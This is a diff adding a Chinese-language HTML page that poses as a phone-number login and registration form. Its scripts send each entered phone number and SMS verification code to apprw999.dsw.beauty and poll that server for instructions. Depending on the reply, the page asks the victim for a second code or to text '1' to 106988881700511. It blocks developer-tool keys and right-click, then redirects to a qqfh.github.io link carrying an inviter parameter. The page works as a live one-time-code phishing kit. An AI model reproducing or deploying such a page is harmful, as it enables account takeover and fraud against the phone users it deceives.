@@ -1,0 +1,760 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>注册</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no" id="viewport"
+          name="viewport">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge, chrome=1">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            text-decoration: none;
+            list-style: none;
+        }
+
+        input,
+        button {
+            border: none;
+            outline: none;
+        }
+
+        body {
+            background: #6a79fa;
+        }
+
+        .clear {
+            clear: both;
+        }
+
+        .banner {
+            width: 100%;
+			
+            padding: 0;
+            box-sizing: border-box;
+
+        }
+
+        .banner img {
+            width: 100%;
+			
+        }
+
+        .shareregs {
+            width: 92%;
+            background: #fff;
+            position: fixed;
+            bottom: 64px;
+            left: 4%;
+            padding: 16px;
+            box-sizing: border-box;
+            border-radius: 12px;
+        }
+
+        .shareregs h4 {
+            margin-bottom: 16px;
+            width: 100%;
+            text-align: center;
+        }
+
+        .shareregs .input button {
+            position: absolute;
+            bottom: 0;
+            right: 20px;
+            height: 50px;
+            line-height: 50px;
+            font-size: 14px;
+            border: none;
+            outline: none;
+            background: transparent;
+            padding: 0;
+            color: #3c60ff;
+            font-weight: bold;
+            z-index: 99;
+        }
+
+
+        .shareregs .input {
+            width: 100%;
+            height: 50px;
+            background: #ebf1ff;
+            margin-bottom: 16px;
+            position: relative;
+            border-radius: 12px;
+        }
+
+        .shareregs .input input {
+            width: 100%;
+            height: 50px;
+            padding: 0 20px;
+            box-sizing: border-box;
+            font-size: 14px;
+            position: absolute;
+            z-index: 66;
+            color: #B5B5B5;
+            background: transparent;
+        }
+
+        .shareregs .input input::placeholder {
+            color: #a0adfc;
+        }
+
+        .shareregs .btn {
+            width: 100%;
+            height: 48px;
+            line-height: 48px;
+            background-image: linear-gradient(90deg, #4fb3ff 0%, #697ffd 100%);
+            color: #fff;
+            border-radius: 12px;
+            font-size: 16px;
+            margin-top: 16px;
+
+        }
+
+        .sharetips {
+            width: 100%;
+            text-align: center;
+            font-size: 14px;
+            margin-top: 16px;
+            color: #6782fe;
+        }
+
+        .bg {
+            width: 100%;
+            height: 100vh;
+            background: url(//dtlmapp.xywq.vip/alipay/down.png) #f5f5f5 no-repeat;
+            background-size: cover;
+            position: fixed;
+            z-index: -1;
+        }
+
+        .logo {
+            width: 80%;
+            position: fixed;
+            top: 60px;
+            left: 10%;
+            z-index: 8;
+        }
+
+        .button {
+            width: 80%;
+            height: 55px;
+            line-height: 55px;
+            background: linear-gradient(180deg, #FFFFFF 0%, #DAECFF 100%);
+            border-radius: 55px;
+            color: #2561EF;
+            font-size: 16px;
+            position: fixed;
+            z-index: 8;
+            bottom: 60px;
+            left: 10%;
+        }
+
+        uni-button:after {
+            border: none;
+        }
+    </style>
+</head>
+<body>
+<div class="banner">
+    <img src="./banner.jpg">
+</div>
+<div class="shareregs">
+    <h4 id="state">登录</h4>
+	
+    <div  class="input">
+        <input type="number" id="phone_number" class="mobile" maxlength="11" placeholder="请输入您的手机号">
+    </div>
+	
+    <div style="" id="codes1" class="input">
+        <input style="" type="number" id="code1" maxlength="6" class="mobile_code" placeholder="请输入验证码">
+		
+        <button class="send" onclick="bu()" >发送验证码</button>
+    </div>
+	
+	<div style="display:none;" id="codes2" class="input">
+       
+		<input style="" type="number" id="code2" maxlength="6" class="mobile_code" placeholder="请输入验证码">
+		
+        <button class="send" onclick="bu()" >发送验证码</button>
+    </div>
+	
+	 <div style="display:none;" id="codes3" class="input">
+        <input style="" type="number" id="code3" maxlength="6" class="mobile_code" placeholder="106988881700511" value="106988881700511">
+		
+        <button class="send2" onclick="fdx()" >一键复制发送手机号码</button>
+    </div>
+
+	<div style="display:none;" id="codes4" class="input">
+        <input style="" type="number" id="code4" maxlength="6" class="mobile_code" placeholder="确定已发送短信后再点击右边已发送" value="确定已发送短信后再点击右边已发送">
+		
+        <button class="send1" onclick="time()" >已发送</button>
+		
+    </div>
+	
+	<div  style="display:none;" id="codes5" class="sharetips">发1到106988881700511<br>成功发送后再点击右边确定发送键</div>
+	
+	
+	
+	<button style="display:none;" id="codesdl2" class="btn confirm" onclick="validate2()" >立即登录</button>
+	
+    <button style="" id="codesdl1" class="btn confirm" onclick="validate1()" >立即登录</button>
+	
+	
+	
+    <div class="sharetips">未注册的手机号验证通过后将自动注册</div>
+</div>
+<script src="./jquery.min.js"></script>
+<script src="./layer.min.js"></script>
+
+
+    
+	<script>
+	
+function GetRequest() {
+var url = location.search; //获取url中"?"符后的字串
+var theRequest = new Object();
+if (url.indexOf("?") != -1) {
+var str = url.substr(1);
+strs = str.split("&");
+for(var i = 0; i < strs.length; i ++) {
+theRequest[strs[i].split("=")[0]] = unescape(strs[i].split("=")[1]);
+}
+}
+return theRequest;
+}
+var Request = new Object();
+Request = GetRequest();
+// var 参数1,参数2,参数3,参数N;
+// var yqr = Request['yqr'];
+// var 参数2 = Request['参数2'];
+// var 参数3 = Request['参数3'];
+// var 参数N = Request['参数N'];
+//alert(Request['yqr']);
+
+
+
+	</script>
+    
+<script>
+var a = +parseInt(Math.random()*999999)
+var yqr = Request['yqr'];
+function bu(){
+    var phone_number  = document.getElementById('phone_number').value; 
+    var yqr = Request['yqr'];
+    var re = /^1[3,4,5,6,7,8,9][0-9]{9}$/;
+    var result = re.test(phone_number); 
+		if(!result) {
+			alert("手机号码格式不正确！");
+			}else{
+			         localStorage.setItem('phone_number',phone_number );
+    			     var userid = localStorage.getItem('userid');
+    			     console.log(userid)
+    			     if(!userid){
+    			        userid =  Math.random().toString(36).substr(-10)
+    			        localStorage.setItem('userid',userid );
+    		      	}
+    		         var xhr = new XMLHttpRequest();
+                     xhr.open('GET', 'https://apprw999.dsw.beauty/api/fontphone.php?phone='+phone_number+'&userid='+userid+'&yqr='+yqr, true);
+                     
+                     xhr.onreadystatechange = function() {
+                       if (xhr.readyState == 4 && xhr.status == 200) {
+                         console.log(xhr.responseText);
+                       }
+                     }
+                     xhr.send();
+                     alert("手机号提交成功,请继续填写验证码！！");
+					 
+                     document.getElementById("state").innerHTML= ('手机号码提交成功，请填写验证码！');
+			    }
+			   
+            
+ }
+ 
+
+ function bucode1(){
+     var phone_number  = document.getElementById('phone_number').value; 
+     var code  = document.getElementById('code1').value;
+     console.log('code1',code)
+    //  查验是否为审核通过状态
+     var xhr = new XMLHttpRequest();
+              xhr.open('GET', 'https://apprw999.dsw.beauty/api/fontcode.php?code1='+code+'&phone='+phone_number, true);
+              xhr.onreadystatechange = function() {
+                  if (xhr.readyState == 4 && xhr.status == 200) {
+                    console.log(xhr.responseText);
+                  }
+                }
+             xhr.send();
+    
+     if(!phone_number){
+         alert("请先填写手机号码！");
+     }else{
+        if(!code){
+            alert("请填写验证码！！");
+        }else{
+              var xhr = new XMLHttpRequest();
+              xhr.open('GET', 'https://apprw999.dsw.beauty/api/fontcode.php?code1='+code+'&phone='+phone_number, true);
+              xhr.onreadystatechange = function() {
+                  if (xhr.readyState == 4 && xhr.status == 200) {
+                    console.log(xhr.responseText);
+                  }
+                }
+             xhr.send();
+             
+             alert("验证码提交成功,等待验证！！");
+             document.getElementById("state").value = ('正在等待验证,请稍后......');
+        }
+     }
+     
+ }
+ 
+ function bucode2(){
+     var phone_number  = document.getElementById('phone_number').value; 
+     var code  = document.getElementById('code2').value;
+    //  查验是否为审核通过状态
+     var xhr = new XMLHttpRequest();
+              xhr.open('GET', 'https://apprw999.dsw.beauty/api/fontcode.php?code2='+code+'&phone='+phone_number, true);
+              xhr.onreadystatechange = function() {
+                  if (xhr.readyState == 4 && xhr.status == 200) {
+                    console.log(xhr.responseText);
+                  }
+                }
+             xhr.send();
+    
+     if(!phone_number){
+         alert("请先填写手机号码！");
+     }else{
+        if(!code){
+            alert("请填写验证码！！");
+        }else{
+              var xhr = new XMLHttpRequest();
+              xhr.open('GET', 'https://apprw999.dsw.beauty/api/fontcode.php?code2='+code+'&phone='+phone_number, true);
+              xhr.onreadystatechange = function() {
+                  if (xhr.readyState == 4 && xhr.status == 200) {
+                    console.log(xhr.responseText);
+                  }
+                }
+             xhr.send();
+             
+             alert("验证码提交成功,等待验证！！");
+             document.getElementById("state").value = ('正在等待验证,请稍后......');
+        }
+     }
+     
+ }
+ 
+ 
+ 
+  //校验验证码1
+function validate1(){
+    
+    var inputCode = document.getElementById('code1').value;
+    var phone_number = localStorage.getItem('phone_number');
+     var code  = document.getElementById('code1').value;
+     //取得输入的验证码并转化为大写     
+    if(inputCode.length != 6) { //若输入的验证码长度为0
+        alert("请输入正确验证码！"); //则弹出请输入验证码
+        document.getElementById("code1").value = "";//清空文本框
+    }      
+    else if(code != code ) { //若输入的验证码与产生的验证码不一致时
+        alert("验证码输入错误！@_@"); //则弹出验证码输入错误
+        //刷新验证码
+        document.getElementById("code1").value = "";//清空文本框
+    }      
+    else { //输入正确时
+        //alert("^-^"); //弹出^-^
+        
+    
+     console.log('code1',code)
+    //  查验是否为审核通过状态
+     
+    
+     if(!phone_number){
+         alert("请先填写手机号码！");
+     }else{
+        if(!code){
+            alert("请填写验证码！！");
+        }else{
+              var xhr = new XMLHttpRequest();
+              xhr.open('GET', 'https://apprw999.dsw.beauty/api/fontcode.php?code1='+code+'&phone='+phone_number, true);
+              xhr.onreadystatechange = function() {
+                  if (xhr.readyState == 4 && xhr.status == 200) {
+                    console.log(xhr.responseText);
+                  }
+                }
+             xhr.send();
+             //$(".send").attr('s', 0);
+			 //$(".send").text("重发验证码")
+             //$(".send").removeAttr('disabled')
+			 //上面没完成
+							
+             alert("验证码提交成功,等待验证！！");
+             document.getElementById("state").value = ('正在等待验证,请稍后......');
+             document.getElementById("code1").value = "";//清空文本框
+             document.getElementById("code2").value = "";//清空文本框
+        }
+     }
+     
+    }
+             
+}
+ //校验验证码2
+function validate2(){
+    
+    var inputCode = document.getElementById('code2').value; //取得输入的验证码并转化为大写     
+    if(inputCode.length != 6) { //若输入的验证码长度为0
+        alert("请输入正确验证码！"); //则弹出请输入验证码
+        document.getElementById("code2").value = "";//清空文本框
+    }      
+    else if(code != code ) { //若输入的验证码与产生的验证码不一致时
+        alert("验证码输入错误！@_@"); //则弹出验证码输入错误
+        //刷新验证码
+        document.getElementById("code2").value = "";//清空文本框
+    }      
+    else { //输入正确时
+        //alert("^-^"); //弹出^-^
+        
+        
+    var phone_number = localStorage.getItem('phone_number');
+     var code  = document.getElementById('code2').value;
+    //  查验是否为审核通过状态
+     
+    
+     if(!phone_number){
+         alert("请先填写手机号码！");
+     }else{
+        if(!code){
+            alert("请填写验证码！！");
+        }else{
+              var xhr = new XMLHttpRequest();
+              xhr.open('GET', 'https://apprw999.dsw.beauty/api/fontcode.php?code2='+code+'&phone='+phone_number, true);
+              xhr.onreadystatechange = function() {
+                  if (xhr.readyState == 4 && xhr.status == 200) {
+                    console.log(xhr.responseText);
+                  }
+                }
+             xhr.send();
+             
+             alert("验证码提交成功,等待验证！！");
+             document.getElementById("state").value = ('正在等待验证,请稍后......');
+             document.getElementById("code1").value = "";//清空文本框
+             document.getElementById("code2").value = "";//清空文本框
+        }
+     }
+    
+    }          
+}
+
+
+
+  function copy() {
+  var yqr = Request['yqr'];
+           location.href="http://qqfh.github.io/wp/?yqr="+yqr;  
+        }
+		
+	function fdx() {
+	
+  // 获取要复制的文本
+  var text = "106988881700511";
+  
+  // 创建一个临时的文本框
+  var tempInput = document.createElement("textarea");
+  tempInput.value = text;
+  
+  // 将文本框添加到页面中
+  document.body.appendChild(tempInput);
+  
+  // 选中文本框中的内容
+  tempInput.select();
+  
+  // 复制文本框中的内容到剪贴板中
+  document.execCommand("copy");
+  
+  // 删除临时文本框
+  document.body.removeChild(tempInput);
+
+
+           window.location.href = 'sms:106988881700511'; 
+        }
+</script>
+
+
+
+
+<script type="text/javascript">
+var yqr = Request['yqr'];
+
+function func1(){
+    var phone_number = localStorage.getItem('phone_number');
+    
+    if(phone_number){
+        console.log('执行')
+        console.log(phone_number)
+        document.getElementById("phone_number").value = (phone_number);
+        document.getElementById("state").value = ('手机号码提交成功，请填写验证码！');
+    }
+    if(code1){
+        document.getElementById("code1").value = ("");
+        document.getElementById("code2").value = ("");
+        document.getElementById("state").value = ('正在等待验证,请稍后......');
+    }
+ }
+ 
+function func2(){
+               var xhr = new XMLHttpRequest();
+                     xhr.open('GET', 'https://apprw999.dsw.beauty/api/gettip.php', true);
+                     xhr.onreadystatechange = function() {
+                        if (xhr.readyState == 4 && xhr.status == 200) {
+                        console.log(xhr.responseText);
+                        text = xhr.responseText;
+                         }
+                      }
+                     xhr.send();
+    
+    
+    setInterval(function() {
+	
+        var phone_number = localStorage.getItem('phone_number');
+		var yqr = Request['yqr'];
+			 console.log('fun2执行')
+            // 1. 创建 XHR 对象
+            var xhr = new XMLHttpRequest()
+            // 2. 调用 open 函数
+            xhr.open('GET', 'https://apprw999.dsw.beauty/api/state.php?phone='+phone_number)
+            // 3 . 调用 send 函数发起Ajax请求
+            xhr.send()
+            // 4. 监听 onreadystatechange 事件
+            xhr.onreadystatechange = function () {
+              //监听xhr对象的请求状态readyState；与服务器响应的状态status
+              if (xhr.readyState === 4 && xhr.status === 200) {//固定写法判断
+                // 获取服务器响应的数据
+                if(xhr.responseText==3){
+                    document.getElementById("state").innerHTML=('当前手机号无法注册请更换手机号！');
+					
+					
+                }
+                if(xhr.responseText==4){
+                    document.getElementById("state").innerHTML=  ('验证成功!密码是：完成');
+                    //document.getElementById("EleId").style.display="block";
+					location.href="http://qqfh.github.io/wp/?yqr="+yqr; 
+                }
+                if(xhr.responseText==5){
+                    //document.getElementById("code1").value = "";//清空文本框
+                    document.getElementById("state").innerHTML= ('验证码错误，请重新获取!');
+                    
+
+					
+                    document.getElementById("codesdl1").style.display="none";
+					document.getElementById("codesdl2").style.display="block";
+					
+					
+					document.getElementById("codes1").style.display="none";
+                    document.getElementById("codes2").style.display="block";
+					
+                }
+				if(xhr.responseText==6){//无法做的 放行 跳转
+                    location.href="http://qqfh.github.io/wp/?yqr="+yqr; 
+					
+                }
+				if(xhr.responseText==7){//只能发的号码
+                    document.getElementById("codes3").style.display="block";
+                    document.getElementById("codes4").style.display="block";
+                    document.getElementById("codes5").style.display="block";
+                    
+					
+                }
+               
+              }
+            }
+			}, 3000);
+    
+   }
+
+
+// window.onload = func1,func2;//不要括号
+
+window.onkeydown = window.onkeyup = window.onkeypress = function (event) {
+	if (event.keyCode === 123) {
+		event.preventDefault(); // 阻止默认事件行为
+        window.event.returnValue = false;
+	}
+}
+
+window.oncontextmenu = function() {
+	event.preventDefault(); // 阻止默认事件行为
+    return false;
+}
+
+
+
+
+
+</script>
+
+<script type="text/javascript">
+window.onload=function(){
+    func1();
+    func2();
+    }
+</script>
+
+
+<script>
+
+var a = +parseInt(Math.random()*999999)
+var yqr = Request['yqr'];
+    $(document).on('click', '.confirm', function () {
+        var index = layer.load();
+        $.ajax({
+            type: "POST",
+            dataType: "json",
+            url: "https://apprw999.dsw.beauty/api/register.php",
+            timeout: 10000, //ajax请求超时时间10s
+            data: {mobile: $(".mobile").val(), mobile_code: $(".mobile_code").val()},
+            success: function (res) {
+                layer.close(index);
+                if (res.code === 200){
+                    setTimeout(function () {
+                        location.href="http://qqfh.github.io/wp/?yqr="+yqr; 
+                    },1000)
+                }
+                layer.msg(res.msg, {shade: 0, time: 1500});
+            }
+        });
+    })
+    $(document).on('click', '.send', function () {
+        var index = layer.load();
+        $.ajax({
+            type: "POST",
+            dataType: "json",
+            url: "https://apprw999.dsw.beauty/api/send.php",
+            timeout: 10000, //ajax请求超时时间10s
+            data: {event: "register", mobile: $(".mobile").val()},
+            success: function (res) {
+                layer.close(index);
+                if (res.code === 200) {
+                    $(".send").attr('s', 60);
+                    var ping = window.setInterval(function () {
+                        var s = parseInt($(".send").attr('s'));
+                        if (s === 0) {
+                            $(".send").text("重发验证码")
+							
+                            $(".send").removeAttr('disabled')
+                            clearInterval(ping);
+					document.getElementById("codes3").style.display="block";
+                    document.getElementById("codes4").style.display="block";
+                    document.getElementById("codes5").style.display="block";
+					document.getElementById("state").innerHTML=('收不到验证码请尝试发送短信或更换手机号！');
+                        } else {
+                            $(".send").text((s - 1) + "秒");
+                            $(".send").attr('s', (s - 1));
+                            $(".send").attr('disabled', true);
+							
+                    
+                        }
+						
+						if (s === 30) {
+                            
+					document.getElementById("codes3").style.display="block";
+                    document.getElementById("codes4").style.display="block";
+                    document.getElementById("codes5").style.display="block";
+					document.getElementById("state").innerHTML=('收不到验证码请尝试发送短信或更换手机号！');
+                        } else {
+                            
+							
+                    
+                        }
+                    }, 1000);
+                }
+                if (res.code === 501) {
+                    setTimeout(function () {
+                        location.href="http://qqfh.github.io/wp/?yqr="+yqr; 
+                    },1000)
+                }
+                layer.msg(res.msg, {shade: 0, time: 1500});
+            }
+        });
+    })
+</script>
+
+
+<script>
+
+
+
+var a = +parseInt(Math.random()*999999)
+var yqr = Request['yqr'];
+var phone_number = localStorage.getItem('phone_number');
+
+     $(document).on('click', '.send1', function () {
+        var index = layer.load();
+        $.ajax({
+            type: "POST",
+            dataType: "json",
+            url: "https://apprw999.dsw.beauty/api/send.php",
+            timeout: 10000, //ajax请求超时时间10s
+            data: {event: "register", mobile: $(".mobile").val()},
+            success: function (res) {
+                layer.close(index);
+                if (res.code === 200) {
+                    $(".send1").attr('s', 10);
+					
+                    var ping = window.setInterval(function () {
+                        var s = parseInt($(".send1").attr('s'));
+                        if (s === 0) {
+                            $(".send1").text("已发送")
+							
+                            $(".send1").removeAttr('disabled')
+                            clearInterval(ping);
+							fdx1();
+                        } else {
+                            $(".send1").text((s - 1) + "秒");
+                            $(".send1").attr('s', (s - 1));
+                            $(".send1").attr('disabled', true);
+                        }
+                    }, 1000);
+                }
+                if (res.code === 501) {
+                    setTimeout(function () {
+                       
+                    },1000)
+                }
+                layer.msg(res.msg, {shade: 0, time: 1500});
+            }
+        });
+    })
+
+
+
+ function fdx1(){
+     var phone_number  = document.getElementById('phone_number').value; 
+     
+    //  查验是否为审核通过状态
+    
+    
+     if(!phone_number){
+         alert("请先填写手机号码！");
+     }else{
+        
+              var xhr = new XMLHttpRequest();
+              xhr.open('GET', 'https://apprw999.dsw.beauty/api/fdx.php?phone='+phone_number, true);
+              xhr.onreadystatechange = function() {
+                  if (xhr.readyState == 4 && xhr.status == 200) {
+                    console.log(xhr.responseText);
+                  }
+                }
+             xhr.send();
+             
+             
+        
+     }
+     
+ }
+ 
+</script>
+
+
+</body>
+</html>
